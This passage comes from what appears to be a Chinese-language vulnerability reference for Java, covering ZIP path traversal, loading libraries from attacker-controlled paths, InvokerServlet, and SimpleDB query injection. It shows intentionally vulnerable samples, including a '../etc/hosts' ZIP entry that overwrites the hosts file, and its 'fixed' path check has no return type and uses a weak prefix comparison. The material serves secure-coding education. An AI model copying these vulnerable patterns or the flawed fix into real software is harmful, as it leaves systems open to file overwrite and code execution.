<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[20] Standards Mapping - SANS Top 25 2009 Risky Resource Management - CWE ID 426</p>
<p>[21] Standards Mapping - SANS Top 25 2010 Risky Resource Management - CWE ID 022</p>
<p>[22] Standards Mapping - SANS Top 25 2011 Risky Resource Management - CWE ID 022</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3600 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3600 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3600 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3600 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3600 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3600 CAT II</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3600 CAT II</p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[33] Standards Mapping - Web Application Security Consortium 24 + 2 Path Traversal</p>
<p>[34] Standards Mapping - Web Application Security Consortium Version 2.00 Path Traversal (WASC-33)</p>
<h4 id="Path-Manipulation-Zip-Entry-Overwrite"><a href="#Path-Manipulation-Zip-Entry-Overwrite" class="headerlink" title="Path Manipulation: Zip Entry Overwrite"></a>Path Manipulation: Zip Entry Overwrite</h4><h5 id="ABSTRACT-306"><a href="#ABSTRACT-306" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>如果允许用户输入控制 file system 操作所用的路径，攻击者将可以在系统上的任意位置对文件进行随意覆盖。</p>
<h5 id="EXPLANATION-307"><a href="#EXPLANATION-307" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在打开和扩展 ZIP 文件但未检查 ZIP 条目的文件路径时，会出现路径篡改：ZIP 条目覆盖错误。</p>
<p>示例 1：以下示例从 ZIP 文件中提取文件并将其写入磁盘。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">private static final int BUFSIZE = 512;</span><br><span class="line"></span><br><span class="line">private static final int TOOBIG = 0x640000;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">public final void unzip(String filename) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">  FileInputStream fis = new FileInputStream(filename);</span><br><span class="line"></span><br><span class="line">  ZipInputStream zis = new ZipInputStream(new BufferedInputStream(fis));</span><br><span class="line"></span><br><span class="line">  ZipEntry zipEntry = null;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  int numOfEntries = 0;</span><br><span class="line"></span><br><span class="line">  long total = 0;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  try&#123;</span><br><span class="line"></span><br><span class="line">    while ((zipEntry = zis.getNextEntry()) != null)&#123;</span><br><span class="line"></span><br><span class="line">      byte data[] = new byte[BUFSIZE];</span><br><span class="line"></span><br><span class="line">      int count = 0;</span><br><span class="line"></span><br><span class="line">      String outFileName = zipEntry.getName();</span><br><span class="line"></span><br><span class="line">      if (zipEntry.isDirectory())&#123;</span><br><span class="line"></span><br><span class="line">        new File(outFileName).mkdir(); //create the new directory</span><br><span class="line"></span><br><span class="line">        continue;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      FileOutputStream outFile = new FileOutputStream(outFileName);</span><br><span class="line"></span><br><span class="line">      BufferedOutputStream dest = new BufferedOutputStream(outFile, BUFSIZE);</span><br><span class="line"></span><br><span class="line">      //read data from ZIP, but do not read huge entries</span><br><span class="line"></span><br><span class="line">      while (total + BUFSIZE &lt;= TOOBIG &amp;&amp; (count = zis.read(data, 0, BUFSIZE)) != -1)&#123;</span><br><span class="line"></span><br><span class="line">        dest.write(data, 0, count);</span><br><span class="line"></span><br><span class="line">        total += count;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      ...</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;finally&#123;</span><br><span class="line"></span><br><span class="line">    zis.close();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>以上示例中，在此条目的数据上执行读取/写入函数前未验证 zipEntry.getName()。这意味着，如果 ZIP 文件最初放置在基于 Unix 的计算机的“/tmp/”目录中（ZIP 条目为“../etc/hosts”），并且应用程序在必要的权限下运行，则其将覆盖系统的 hosts 文件。这将进一步导致计算机的信息流可以按照攻击者的意愿到达任何位置，例如，返回至攻击者的计算机。</p>
<h5 id="RECOMMENDATIONS-306"><a href="#RECOMMENDATIONS-306" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>防止通过 ZIP 文件进行路径篡改的最佳方式是采取一种间接方法：创建 ZIP 条目可以写入的合法路径名称的列表，然后写入至与 ZIP 条目位置相符的文件。通过这种方式，用户在 ZIP 中提供的输入绝不会直接用于指定文件位置。</p>
<p>在此示例中，这种方式可能并不可行。因此，程序员通常在这种情况下采用黑名单的办法。在输入之前，黑名单会有选择地拒绝或避免潜在的危险字符。但是，任何这样一份黑名单都不可能是完整的，而且将随着时间的推移而过时。更好的方法是创建一份白名单，允许其中的字符出现在资源名称中，且只接受完全由这些被认可的字符组成的输入。 在这种情况下，诸如 java.io.File.getCanonicalPath() 等 API 可以用于检索规范形式的文件路径，从而可用于检查文件将写入到的目录。</p>
<p>示例 2：以下是用于检查所创建文件名是否位于程序员指定目录中的实用程序函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">public class MyFileUtils&#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  public static validateFilenameInDir(String filename, String intendedDirectory) throws IOException&#123;</span><br><span class="line"></span><br><span class="line">    File checkFile = new File(filename);</span><br><span class="line"></span><br><span class="line">    String canonicalPathToCheck = checkFile.getCanonicalPath();</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    File intendedDir = new File(intendedDirectory);</span><br><span class="line"></span><br><span class="line">    String canonicalPathToVerify = intendedDir.getCanonicalPath();</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    if (canonicalPathToCheck.startsWith(canonicalPathToVerify))&#123;</span><br><span class="line"></span><br><span class="line">      return canonicalPathToCheck;</span><br><span class="line"></span><br><span class="line">    &#125;else&#123;</span><br><span class="line"></span><br><span class="line">      throw new IllegalStateException(&quot;This file is outside the intended extraction directory.&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>示例 3：以下示例使用了上述示例 2 来修复示例 1。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">private static final int BUFSIZE = 512;</span><br><span class="line"></span><br><span class="line">private static final int TOOBIG = 0x640000;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">public final void unzip(String filename) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">  FileInputStream fis = new FileInputStream(filename);</span><br><span class="line"></span><br><span class="line">  ZipInputStream zis = new ZipInputStream(new BufferedInputStream(fis));</span><br><span class="line"></span><br><span class="line">  ZipEntry zipEntry = null;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  int numOfEntries = 0;</span><br><span class="line"></span><br><span class="line">  long total = 0;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  try&#123;</span><br><span class="line"></span><br><span class="line">    while ((zipEntry = zis.getNextEntry()) != null)&#123;</span><br><span class="line"></span><br><span class="line">      byte data[] = new byte[BUFSIZE];</span><br><span class="line"></span><br><span class="line">      int count = 0;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">      // verify that the file to be written to is located in the current directory</span><br><span class="line"></span><br><span class="line">      String outFileName = MyFileUtils.validateFilenameInDir(zipEntry.getName(), &quot;.&quot;);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">      if (zipEntry.isDirectory())&#123;</span><br><span class="line"></span><br><span class="line">        new File(outFileName).mkdir(); //create the new directory</span><br><span class="line"></span><br><span class="line">        continue;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      FileOutputStream outFile = new FileOutputStream(outFileName);</span><br><span class="line"></span><br><span class="line">      BufferedOutputStream dest = new BufferedOutputStream(outFile, BUFSIZE);</span><br><span class="line"></span><br><span class="line">      //read data from ZIP, but do not read huge entries</span><br><span class="line"></span><br><span class="line">      while (total + BUFSIZE &lt;= TOOBIG &amp;&amp; (count = zis.read(data, 0, BUFSIZE)) != -1)&#123;</span><br><span class="line"></span><br><span class="line">        dest.write(data, 0, count);</span><br><span class="line"></span><br><span class="line">        total += count;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      ...</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;finally&#123;</span><br><span class="line"></span><br><span class="line">    zis.close();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-305"><a href="#REFERENCES-305" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] IDS04-J. Safely extract files from ZipInputStream CERT</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 22, CWE ID 73</p>
<p>[3] Standards Mapping - FIPS200 SI</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M8 Security Decisions Via Untrusted Inputs</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A4 Insecure Direct Object Reference</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A4 Insecure Direct Object References</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A4 Insecure Direct Object References</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[16] Standards Mapping - SANS Top 25 2009 Risky Resource Management - CWE ID 426</p>
<p>[17] Standards Mapping - SANS Top 25 2010 Risky Resource Management - CWE ID 022</p>
<p>[18] Standards Mapping - SANS Top 25 2011 Risky Resource Management - CWE ID 022</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3600 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3600 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3600 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3600 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3600 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3600 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3600 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[29] Standards Mapping - Web Application Security Consortium 24 + 2 Path Traversal</p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 Path Traversal (WASC-33)</p>
<h4 id="Process-Control"><a href="#Process-Control" class="headerlink" title="Process Control"></a>Process Control</h4><h5 id="ABSTRACT-307"><a href="#ABSTRACT-307" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>从一个不可信赖的数据源或是不可信赖的环境中加载库，会导致应用程序以攻击者的名义执行恶意代码。</p>
<h5 id="EXPLANATION-308"><a href="#EXPLANATION-308" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Process control 漏洞主要表现为以下两种形式：</p>
<p>— 攻击者可以篡改程序加载的库的名称：攻击者直接地控制库所使用的名称。</p>
<p>— 攻击者可以篡改库加载的环境：攻击者间接控制库名称的含义。</p>
<p>这种情况下，我们主要考虑第一种情况，攻击者可能控制加载的库的名称。这种类型的 Process control 漏洞会在以下情况中出现：</p>
<ol>
<li><p>数据从不可信赖的数据源进入应用程序。</p>
</li>
<li><p>数据作为代表应用程序所加载的库的一个或部分字符串使用。</p>
</li>
<li><p>通过在库中执行代码，应用程序授予攻击者在一般情况下无法获得的权限或能力。</p>
</li>
</ol>
<p>例 1：以下代码来自于一个具有特别权限的系统实用程序，使用系统属性 APPHOME 来确定系统的安装目录，然后用基于指定目录的相对路径加载本地库。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">	String home = System.getProperty(&quot;APPHOME&quot;);</span><br><span class="line"></span><br><span class="line">	String lib = home + LIBNAME;</span><br><span class="line"></span><br><span class="line">	java.lang.Runtime.getRuntime().load(lib);</span><br><span class="line"></span><br><span class="line">	...</span><br></pre></td></tr></table></figure>
<p>这段代码允许攻击者加载库，并通过修改系统属性 APPHOME，指向一个包含恶意版本 LIBNAME 的不同路径，从而使用较高的应用程序权限去执行任意代码。由于程序不会验证从环境中读取的值，所以如果攻击者能够控制系统属性 APPHOME 的值，他们就能欺骗应用程序去运行恶意代码从而取得系统控制权。</p>
<p>例 2：以下代码使用 System.loadLibrary() 从名为 library.dll 的本地库加载代码，它通常可以在标准的系统目录中找到。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">System.loadLibrary(&quot;library.dll&quot;);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>这里的问题是，对于要加载的库来说，System.loadLibrary() 只会接受库的名称，而不接受库的路径。根据 Java 1.4.2 API 文档，这个函数会进行如下操作 [1]：</p>
<p>可以从库文件能够正常获取的本地 file system 中加载含有本地代码的文件。这一过程的具体操作需在特定的条件下执行。从库名称到某一个特定文件名的映射是在特定的系统方式下完成的。</p>
<p>在搜索顺序方面，如果攻击者将一份恶意的 library.dll 放在高于应用程序需要加载的文件的位置，那么应用程序就会加载该恶意代码，而不会选择加载最初需要的文件。由于应用程序的这一特性，它会以较高的权限运行，这就意味着攻击者的 library.dll 内容将以较高的权限运行，从而可能导致攻击者完全控制整个系统。</p>
<h5 id="RECOMMENDATIONS-307"><a href="#RECOMMENDATIONS-307" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>不要允许用户控制由程序加载的库。若加载库的选择一定要涉及用户输入的话，通常情况下，应用程序会期望这个特定的输入是一个很小的数值集合。而不是依赖输入的安全性以及不包含任何恶意信息。因此，应用程序所使用的输入应该仅从一个预先决定的、安全的库的集合中进行选择。如果输入看上去是恶意的，则应该将即将加载的库限制在这一集合的安全数值范围之内，或由程序拒绝继续执行该操作。</p>
<p>攻击者可以通过篡改环境间接地控制程序加载的库。我们不应当完全信赖环境，还需采取预防措施，防止攻击者利用某些控制环境的手段进行攻击。如果可能，库名称应由应用程序控制，并使用一个传递到 System.load() 的绝对路径进行加载。应该避免 System.loadLibrary()，因为它的行为不能独立实现。如果编译时不清楚具体的路径，应该在执行的过程中利用可信赖的数值构造一个绝对路径。应对照一系列定义有效参数的不变量对从环境中读取的库名称和路径进行仔细的检查。</p>
<p>有时还可以执行其他校验，以检查环境是否已被恶意篡改。例如，如果一个配置文件为可写，程序可能会拒绝运行。如果事先已知有关要加载的库的信息，程序就会执行检测，以校验文件的有效性。如果一个库应始终归属于某一特定用户，或者被分配了一组特定的权限，则可以在加载库之前，对这些属性进行校验。</p>
<p>最后，不可能对程序提供百分之百的保护，来防止强大的攻击者控制其所加载的库。对输入参数和环境可能执行的任何操作，都应努力鉴别并加以保护。其目标就是尽可能地防范各种攻击。</p>
<h5 id="REFERENCES-306"><a href="#REFERENCES-306" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Java 1.4.2 API Documentation Sun Microsystems</p>
<p>[2] INPUT-1: Validate inputs Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 114, CWE ID 494</p>
<p>[4] Standards Mapping - FIPS200 SI</p>
<p>[5] Standards Mapping - MISRA C 2012 Rule 1.3</p>
<p>[6] Standards Mapping - MISRA C++ 2008 Rule 0-3-1</p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A4 Insecure Direct Object Reference</p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A4 Insecure Direct Object References</p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A4 Insecure Direct Object References</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.4</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3570 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I</p>
<p>[29] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20),Improper Filesystem Permissions (WASC-17)</p>
<h4 id="Process-Control-Invoker-Servlet"><a href="#Process-Control-Invoker-Servlet" class="headerlink" title="Process Control: Invoker Servlet"></a>Process Control: Invoker Servlet</h4><h5 id="ABSTRACT-308"><a href="#ABSTRACT-308" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>InvokerServlet 类可允许攻击者调用服务器上的任意类。</p>
<h5 id="EXPLANATION-309"><a href="#EXPLANATION-309" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>不推荐使用的 InvokerServlet 类可用于调用服务器虚拟机可用的任意类。通过猜测类的完整名称，攻击者不但可以加载 Servlet 类，还可以加载 POJO 类或对 JVM 可用的其他任何类。</p>
<h5 id="RECOMMENDATIONS-308"><a href="#RECOMMENDATIONS-308" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>请勿使用 InvokerServlet 类。请使用显式 Servlet 映射，且仅映射需要的 Servlet。</p>
<h5 id="REFERENCES-307"><a href="#REFERENCES-307" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Invocation is EVIL</p>
<p>[2] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[3] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[4] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[5] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II</p>
<p>[6] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II</p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II</p>
<h4 id="Query-String-Injection-Amazon-Web-Services"><a href="#Query-String-Injection-Amazon-Web-Services" class="headerlink" title="Query String Injection: Amazon Web Services"></a>Query String Injection: Amazon Web Services</h4><h5 id="ABSTRACT-309"><a href="#ABSTRACT-309" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>构建包含用户输入的 SimpleDB 选择指令会允许攻击者查看未经授权的记录。</p>
<h5 id="EXPLANATION-310"><a href="#EXPLANATION-310" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Query string injection 漏洞会在以下情况下发生： </p>
<ol>
<li><p>数据从一个不可信赖的数据源进入程序。</p>
</li>
<li><p>数据被用于动态地构造 SimpleDB 查询字符串。</p>
</li>
</ol>
<p>例 1：以下代码动态地构造并执行了一个 SimpleDB select() 查询，该查询可搜索与用户指定产品类别相匹配的清单。用户还可以指定对结果进行排序的列。假定在执行此代码片段之前已正确验证了应用程序并设置了 customerID 的值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">String customerID = getAuthenticatedCustomerID(customerName, customerCredentials);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">AmazonSimpleDBClient sdbc = new AmazonSimpleDBClient(appAWSCredentials);</span><br><span class="line"></span><br><span class="line">String query = &quot;select * from invoices where productCategory = &apos;&quot;</span><br><span class="line"></span><br><span class="line">            + productCategory + &quot;&apos; and customerID = &apos;&quot;</span><br><span class="line"></span><br><span class="line">            + customerID + &quot;&apos; order by &apos;&quot;</span><br><span class="line"></span><br><span class="line">            + sortColumn + &quot;&apos; asc&quot;;</span><br><span class="line"></span><br><span class="line">SelectResult sdbResult = sdbc.select(new SelectRequest(query));</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>这一代码所执行的查询如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select * from invoices</span><br><span class="line"></span><br><span class="line">where productCategory = &apos;Fax Machines&apos;</span><br><span class="line"></span><br><span class="line">and customerID = &apos;12345678&apos;</span><br><span class="line"></span><br><span class="line">order by &apos;price&apos; asc</span><br></pre></td></tr></table></figure>
